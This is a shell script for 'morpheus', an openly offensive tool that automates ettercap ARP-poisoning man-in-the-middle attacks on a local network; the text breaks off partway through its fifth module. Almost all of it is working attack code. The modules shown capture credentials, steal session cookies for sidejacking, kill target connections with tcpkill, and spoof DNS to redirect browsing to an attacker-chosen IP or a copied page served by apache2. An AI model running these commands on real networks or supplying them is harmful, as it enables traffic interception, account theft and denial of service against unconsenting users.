#!/bin/sh
###
# morpheus - automated ettercap TCP/IP Hijacking tool
# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.9
# Suspicious-Shell-Activity (SSA) RedTeam develop @2016
# codename: blue_dreams [ GPL licensed ]
#
# [DEPENDENCIES]
# required          : ettercap, nmap, zenity, apache2
# sub-dependencies  : dnsniff (urlsnarf, tcpkill)
# Distros Supported : Linux Ubuntu, Kali, Mint, Parrot OS
# Credits: alor&naga (ettercap framework)  | fyodor (nmap framework)| apache2 (Rob McCool)
# filters: irongeek (replace img) | seannicholls (rotate 180º) | TheBlaCkCoDeR09 (ToR-Browser-0day)
###


###
# Resize terminal windows size befor running the tool (gnome terminal)
# Special thanks to h4x0r Milton@Barra for this little piece of heaven! :D
resize -s 37 85 > /dev/null
# inicio




# -----------------------------------
# Colorise shell Script output leters
# -----------------------------------
Colors() {
Escape="\033";
  white="${Escape}[0m";
  RedF="${Escape}[31m";
  GreenF="${Escape}[32m";
  YellowF="${Escape}[33m";
  BlueF="${Escape}[34m";
  CyanF="${Escape}[36m";
Reset="${Escape}[0m";
}



Colors;
echo ""
cat << !
    ███╗   ███╗ ██████╗ ██████╗ ██████╗ ██╗  ██╗███████╗██╗   ██╗███████╗
    ████╗ ████║██╔═══██╗██╔══██╗██╔══██╗██║  ██║██╔════╝██║   ██║██╔════╝
    ██╔████╔██║██║   ██║██████╔╝██████╔╝███████║█████╗  ██║   ██║███████╗
    ██║╚██╔╝██║██║   ██║██╔══██╗██╔═══╝ ██╔══██║██╔══╝  ██║   ██║╚════██║
    ██║ ╚═╝ ██║╚██████╔╝██║  ██║██║     ██║  ██║███████╗╚██████╔╝███████║
    ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚══════╝
!
# -----------------------------------------
# check if user is root
# and if dependencies are proper installed
# ----------------------------------------
if [ $(id -u) != "0" ]; then
echo ""
echo ${RedF}[☠]${white} we need to be root to run this script...${Reset};
echo ${RedF}[☠]${white} execute [ sudo ./morpheus.sh ] on terminal ${Reset};
exit
fi


apc=`which ettercap`
if [ "$?" != "0" ]; then
echo ""
echo ${RedF}[☠]${white} ettercap '->' not found! ${Reset};
sleep 1
echo ${RedF}[☠]${white} This script requires ettercap to work! ${Reset};
echo ${RedF}[☠]${white} Please run: sudo apt-get install ettercap ${Reset};
echo ${RedF}[☠]${white} to install missing dependencies... ${Reset};
exit
fi



npm=`which nmap`
if [ "$?" != "0" ]; then
echo ""
echo ${RedF}[☠]${white} nmap '->' not found! ${Reset};
sleep 1
echo ${RedF}[☠]${white} This script requires nmap to work! ${Reset};
echo ${RedF}[☠]${white} Please run: sudo apt-get install nmap ${Reset};
echo ${RedF}[☠]${white} to install missing dependencies... ${Reset};
exit
fi



npm=`which apache2`
if [ "$?" != "0" ]; then
echo ""
echo ${RedF}[☠]${white} apache2 '->' not found! ${Reset};
sleep 1
echo ${RedF}[☠]${white} This script requires apache2 to work! ${Reset};
echo ${RedF}[☠]${white} Please run: sudo apt-get install apache ${Reset};
echo ${RedF}[☠]${white} to install missing dependencies... ${Reset};
exit
fi





# ------------------------------------------
# pass arguments to script [ -h ]
# we can use: ./morpheus.sh -h for help menu
# ------------------------------------------
while getopts ":h" opt; do
  case $opt in
    h)
cat << !
---
-- Author: r00t-3xp10it | SSA RedTeam @2016
-- Supported: Linux Kali, Ubuntu, Mint, Parrot OS
-- Suspicious-Shell-Activity (SSA) RedTeam develop @2016
---

   morpheus.sh framework automates tcp/udp packet manipulation tasks by using
   ettercap filters to manipulate target http requests under MitM attacks
   replacing the http packet contents by our own contents befor sending the
   packet back to the host that have request for it (tcp/ip hijacking).

   morpheus ships with a collection of etter filters writen be me to acomplish
   various tasks: replacing images in webpages, replace text in webpages, inject
   payloads using html <form> tag, denial-of-service attack (drop packets from source)
   https/ssh downgrade attacks, redirect target browser traffic to another ip address
   and also gives you the ability to build/compile your filter from scratch and lunch
   it through morpheus framework.

!
   exit
    ;;
    \?)
      echo ${RedF}[x]${white} Invalid option:${RedF} -$OPTARG ${Reset}; >&2
      exit
    ;;
  esac
done




# ---------------------
# Variable declarations
# ---------------------
dtr=`date | awk '{print $4}'`        # grab current hour
V3R="1.9"                            # module version number
cnm="blue_dream"                     # module codename
DiStR0=`awk '{print $1}' /etc/issue` # grab distribution -  Ubuntu or Kali
IPATH=`pwd`                          # grab morpheus.sh install path
GaTe=`ip route | grep "default" | awk {'print $3'}` > /dev/null 2>&1    # gateway
IP_RANGE=`ip route | grep "kernel" | awk {'print $1'}` > /dev/null 2>&1 # ip-range
PrompT=`cat $IPATH/settings | egrep -m 1 "PROMPT_DISPLAY" | cut -d '=' -f2` > /dev/null 2>&1
LoGs=`cat $IPATH/settings | egrep -m 1 "WRITE_LOGFILES" | cut -d '=' -f2` > /dev/null 2>&1
IpV=`cat $IPATH/settings | egrep -m 1 "USE_IPV6" | cut -d '=' -f2` > /dev/null 2>&1
Edns=`cat $IPATH/settings | egrep -m 1 "ETTER_DNS" | cut -d '=' -f2` > /dev/null 2>&1
Econ=`cat $IPATH/settings | egrep -m 1 "ETTER_CONF" | cut -d '=' -f2` > /dev/null 2>&1
ApachE=`cat $IPATH/settings | egrep -m 1 "AP_PATH" | cut -d '=' -f2` > /dev/null 2>&1
TcPkiL=`cat $IPATH/settings | egrep -m 1 "TCP_KILL" | cut -d '=' -f2` > /dev/null 2>&1
UsNar=`cat $IPATH/settings | egrep -m 1 "URL_SNARF" | cut -d '=' -f2` > /dev/null 2>&1




# ---------------------------------------------
# grab Operative System distro to store IP addr
# output = Ubuntu OR Kali OR Parrot OR BackBox
# ---------------------------------------------
InT3R=`netstat -r | grep "default" | awk {'print $8'}` # grab interface in use
case $DiStR0 in
    Kali) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Debian) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Ubuntu) IP=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'} | cut -d ':' -f2`;;
    Parrot) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    BackBox) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    elementary) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    *) IP=`zenity --title="☠ Input your IP addr ☠" --text "example: 192.168.1.68" --entry --width 270`;;
esac


# config internal framework settings
ping -c 4 www.google.com | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="Config internal framework settings...\nip addr, ip range, gateway, interface\netter.conf, etter.dns, uid/gid privileges." --percentage=0 --auto-close --width 290 > /dev/null 2>&1
if [ -e $Econ ]; then
  cp $Econ /tmp/etter.conf > /dev/null 2>&1
  cp $IPATH/bin/etter.conf $Econ > /dev/null 2>&1
  sleep 1
else
  echo ${RedF}[x]${white} morpheus cant Find:${RedF} $Econ ${Reset};
  echo ${RedF}[x]${white} edit settings File to input path of etter.conf File ${Reset};
  sleep 2
  exit
fi


# ----------------------------------
# bash trap ctrl-c and call ctrl_c()
# ----------------------------------
trap ctrl_c INT
ctrl_c() {
echo "${RedF}[x]${white} CTRL+C abort tasks${RedF}...${Reset}"
# clean logfiles folder at exit
rm $IPATH/logs/lan.mop > /dev/null 2>&1
rm $IPATH/output/firewall.ef > /dev/null 2>&1
rm $IPATH/output/template.ef > /dev/null 2>&1
rm $IPATH/output/packet_drop.ef > /dev/null 2>&1
rm $IPATH/output/img_replace.ef > /dev/null 2>&1
# revert filters to default stage
mv $IPATH/filters/firewall.rb $IPATH/filters/firewall.eft > /dev/null 2>&1
mv $IPATH/filters/template.rb $IPATH/filters/template.eft > /dev/null 2>&1
mv $IPATH/filters/packet_drop.rb $IPATH/filters/packet_drop.eft > /dev/null 2>&1
mv $IPATH/filters/img_replace.rb $IPATH/filters/img_replace.eft > /dev/null 2>&1
# revert ettercap conf files to default stage
if [ -e $Edns ]; then
mv /tmp/etter.dns $Edns > /dev/null 2>&1
fi
if [ -e $Econ ]; then
mv /tmp/etter.conf $Econ > /dev/null 2>&1
fi
sleep 2
exit
}



#
#
# START OF SCRIPT FUNTIONS
#
#
# ----------------------------------------
# PRE-CONFIGURATED TEMPLATE - FIREWALL.EFT
# ----------------------------------------
sh_stage1 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}This module acts like a firewall report/block/capture_credentials ${BlueF}|"
echo "${BlueF}    | ${YellowF}    from the selected targets tcp/udp connections (local lan)     ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1

  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  cp $IPATH/filters/firewall.eft $IPATH/filters/firewall.rb > /dev/null 2>&1
  sleep 1

  echo ${BlueF}[☠]${white} Edit firewall.eft${RedF}!${Reset};
  sleep 1
fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose first target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
fil_two=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose last target to filter through morpheus.\nchose gateway ip, if you dont have any more targets." --entry --width 270) > /dev/null 2>&1


  cd $IPATH/filters
  ed=`hostname`
  echo "$ed"7 > /tmp/test
  hOstNaMe=`cat /tmp/test`
  dIsd=`uname -r`
  # replace values in template.filter with sed bash command
  sed -i "s|TaRONE|$fil_one|g" firewall.eft # NO dev/null to report file not existence :D
  sed -i "s|TaRTWO|$fil_two|g" firewall.eft > /dev/null 2>&1
  sed -i "s|hOst|$hOstNaMe|g" firewall.eft > /dev/null 2>&1
  sed -i "s|MoDeM|$GaTe|g" firewall.eft > /dev/null 2>&1
  sed -i "s|DisTr|$dIsd|g" firewall.eft > /dev/null 2>&1
  rm /tmp/test > /dev/null 2>&1
  cd $IPATH
  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
  xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/firewall.eft"
  sleep 1

    # compiling firewall.eft to be used in ettercap
    echo ${BlueF}[☠]${white} Compiling firewall.eft${RedF}!${Reset};
    xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/firewall.eft -o $IPATH/output/firewall.ef && sleep 3"
    sleep 1
    # port-forward
    # echo "1" > /proc/sys/net/ipv4/ip_forward
    cd $IPATH/logs

      # run mitm+filter
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/firewall.ef -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/firewall.ef -L $IPATH/logs/firewall -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/firewall.ef -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/firewall.ef -L $IPATH/logs/firewall -M ARP /$rhost/ /$gateway/
        fi
      fi


  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv $IPATH/filters/firewall.rb $IPATH/filters/firewall.eft > /dev/null 2>&1
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2
  rm $IPATH/output/firewall.ef > /dev/null 2>&1
  cd $IPATH

else
  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
  sleep 2
fi
}






# -------------------------------------------
# SIDEJACKING ATTACK (HTTP) STEAL COOKIE
# -------------------------------------------
sh_stage2 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}    This module will display port 80(http) and port 443(https)    ${BlueF}|"
echo "${BlueF}    | ${YellowF}  traffic from selected target host, And it will warn attacker    ${BlueF}|"
echo "${BlueF}    | ${YellowF} If any auth cookie its captured And stored in 'sidejacking.log'  ${BlueF}|"
echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
echo "${BlueF}    | ${YellowF}  'Also this module allow users to input a cookie name to filter' ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1


  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  cp $IPATH/filters/sidejacking.eft $IPATH/filters/sidejacking.rb > /dev/null 2>&1
  sleep 1

  echo ${BlueF}[☠]${white} Edit sidejacking.eft${RedF}!${Reset};
  sleep 1
  fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nChose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
  FiLteR=$(zenity --title="☠ Enter COOKIE NAME ☠" --text "example:userid\nInput a cookie name to filter through morpheus." --entry --width 270) > /dev/null 2>&1
  # replace values in template.filter with sed bash command
  cd $IPATH/filters
  sed -i "s|TaRgEt|$fil_one|g" sidejacking.eft # NO dev/null to report file not existence :D
  sed -i "s|UsErInPut|$FiLteR|g" sidejacking.eft > /dev/null 2>&1
  cd $IPATH
  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
  xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/sidejacking.eft"
  sleep 1

    # compiling packet_drop.eft to be used in ettercap
    echo ${BlueF}[☠]${white} Compiling sidejacking.eft${RedF}!${Reset};
    xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/sidejacking.eft -o $IPATH/output/sidejacking.ef && sleep 3"
    sleep 1
    # port-forward
    # echo "1" > /proc/sys/net/ipv4/ip_forward
    cd $IPATH/logs

      # run mitm+filter
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -F $IPATH/output/sidejacking.ef -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -F $IPATH/output/sidejacking.ef -L $IPATH/logs/sidejacking -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -F $IPATH/output/sidejacking.ef -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -F $IPATH/output/sidejacking.ef -L $IPATH/logs/sidejacking -M ARP /$rhost/ /$gateway/
        fi
      fi

  # display captured cookies to user
  echo ""
  echo "${BlueF}[☠]${white} host:${YellowF}$fil_one ${white}cookies report${RedF}!"
  echo "${BlueF}[☠]${white} Please check: morpheus/logs/sidejacking.log${RedF}!"
  sleep 3

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv $IPATH/filters/sidejacking.rb $IPATH/filters/sidejacking.eft > /dev/null 2>&1
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2
  rm $IPATH/output/sidejacking.ef > /dev/null 2>&1
  cd $IPATH

else
  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
  sleep 2
fi
}






# -------------------------------------------
# DROP/KILL TCP/UDP CONNECTION TO/FROM TARGET
# -------------------------------------------
sh_stage3 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}   This module will drop/kill any tcp/udp connections attempted   ${BlueF}|"
echo "${BlueF}    | ${YellowF}   to/from target, droping packets from source and destination..  ${BlueF}|"
echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
echo "${BlueF}    | ${YellowF} 'This module uses etter filters and tcpkill to kill connections' ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

ch=`which tcpkill`
if [ "$ch" != "$TcPkiL" ]; then
echo ${RedF}[x]${white} tcpkill utility not found${RedF}!${Reset};
sleep 1
echo ${RedF}[x]${white} please Install:${RedF}dnsniff${white} packet...${Reset};
sleep 3
sh_exit
fi

# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1

  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  cp $IPATH/filters/packet_drop.eft $IPATH/filters/packet_drop.rb > /dev/null 2>&1
  sleep 1

  echo ${BlueF}[☠]${white} Edit packet_drop.eft${RedF}!${Reset};
  sleep 1
 fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
  # replace values in template.filter with sed bash command
  cd $IPATH/filters
  sed -i "s|TaRgEt|$fil_one|g" packet_drop.eft # NO dev/null to report file not existence :D
  cd $IPATH
  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
  xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/packet_drop.eft"
  sleep 1

    # compiling packet_drop.eft to be used in ettercap
    echo ${BlueF}[☠]${white} Compiling packet_drop.eft${RedF}!${Reset};
    xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/packet_drop.eft -o $IPATH/output/packet_drop.ef && sleep 3"
    sleep 1
    # port-forward
    # echo "1" > /proc/sys/net/ipv4/ip_forward
    cd $IPATH/logs

      # run mitm+filter
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        xterm -T "MORPHEUS - TCPKILL [ctrl+c to abort]" -geometry 81x52 -e "tcpkill -i $InT3R -7 host $fil_one" & ettercap -T -Q -i $InT3R -F $IPATH/output/packet_drop.ef -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        xterm -T "MORPHEUS - TCPKILL [ctrl+c to abort]" -geometry 81x52 -e "tcpkill -i $InT3R -7 host $fil_one" & ettercap -T -Q -i $InT3R -F $IPATH/output/packet_drop.ef -L $IPATH/logs/packet_drop -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        xterm -T "MORPHEUS - TCPKILL [ctrl+c to abort]" -geometry 81x52 -e "tcpkill -i $InT3R -7 host $fil_one" & ettercap -T -Q -i $InT3R -F $IPATH/output/packet_drop.ef -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        xterm -T "MORPHEUS - TCPKILL [ctrl+c to abort]" -geometry 81x52 -e "tcpkill -i $InT3R -7 host $fil_one" & ettercap -T -Q -i $InT3R -F $IPATH/output/packet_drop.ef -L $IPATH/logs/packet_drop -M ARP /$rhost/ /$gateway/
        fi
      fi

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv $IPATH/filters/packet_drop.rb $IPATH/filters/packet_drop.eft > /dev/null 2>&1
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2
  rm $IPATH/output/packet_drop.ef > /dev/null 2>&1
  cd $IPATH
  # stop background running proccess
  # sudo pkill ettercap > /dev/null 2>&1
  # sudo pkill tcpkill > /dev/null 2>&1

else
  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
  sleep 2
fi
}






# -----------------------------------------
# REDIRECT TARGET TRAFIC TO ANOTHER IP ADDR
# -----------------------------------------
sh_stage4 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}   This module will ask user to input an ip address to redirect   ${BlueF}|"
echo "${BlueF}    | ${YellowF}    all browser surfing in target to the selected ip address.     ${BlueF}|"
echo "${BlueF}    | ${YellowF}   'All [.com] domains will be redirected to the spoof ip addr'   ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
fil_one=$(zenity --title="☠ DOMAIN TO SPOOF ☠" --text "example: 31.192.120.44\nWARNING: next value must be decimal..." --entry --width 270) > /dev/null 2>&1

  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  sleep 1
  # backup all files needed.
  cd $IPATH/bin
  cp $IPATH/bin/etter.dns etter.rb > /dev/null 2>&1 # backup
  cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
  cp $IPATH/filters/redirect.eft $IPATH/filters/redirect.rb > /dev/null 2>&1 # backup
  # use SED bash command to config our etter.dns
  sed -i "s|TaRgEt|$fil_one|g" etter.dns # NO dev/null to report file not existence :D
  cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
  echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
  # using SED bash command to config redirect.eft
  sed -i "s|IpAdR|$fil_one|g" $IPATH/filters/redirect.eft > /dev/null 2>&1
  cd $IPATH
  sleep 1

# compiling redirect.eft to be used in ettercap
xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/redirect.eft"
echo ${BlueF}[☠]${white} Compiling redirect.eft${RedF}!${Reset};
sleep 1
xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/redirect.eft -o $IPATH/output/redirect.ef && sleep 3"
echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/redirect -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/redirect -M ARP /$rhost/ /$gateway/
        fi
      fi

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
  rm $IPATH/output/redirect.ef > /dev/null 2>&1
  mv /tmp/etter.dns $Edns > /dev/null 2>&1
  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
  mv $IPATH/filters/redirect.rb $IPATH/filters/redirect.eft > /dev/null 2>&1 # backup
  cd $IPATH
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2

else
  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
  sleep 2
fi
}






# -----------------------------------------------
# REDIRECT TARGET TRAFIC TO GOOGLE SPHERE (prank)
# -----------------------------------------------
sh_stage5 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}      This module will redirect target browsing surfing under     ${BlueF}|"
echo "${BlueF}    | ${YellowF}       mitm attacks to google sphere website (google prank)       ${BlueF}|"
echo "${BlueF}    | ${YellowF}      'All [.com] domains will be redirected to mrdoob.com'       ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1

  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  sleep 1
  # backup all files needed.
  cd $IPATH/bin
  cp $IPATH/bin/etter.dns etter.rb > /dev/null 2>&1 # backup
  cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
  cp $IPATH/filters/redirect.eft $IPATH/filters/redirect.rb > /dev/null 2>&1 # backup
  # use SED bash command to config our etter.dns
  sed -i "s|TaRgEt|$IP|g" etter.dns # NO dev/null to report file not existence :D
  cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
  echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
  # using SED bash command to config redirect.eft
  sed -i "s|IpAdR|http://mrdoob.com/projects/chromeexperiments/google-sphere/|g" $IPATH/filters/redirect.eft > /dev/null 2>&1
  # copy files needed to apache2 webroot...
  cp -R $IPATH/bin/phishing/"Google Sphere_files" $ApachE > /dev/null 2>&1
  cp $IPATH/bin/phishing/index.html $ApachE > /dev/null 2>&1
  cd $IPATH
  sleep 1

# compiling packet_drop.eft to be used in ettercap
xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/redirect.eft"
echo ${BlueF}[☠]${white} Compiling redirect.eft${RedF}!${Reset};
sleep 1
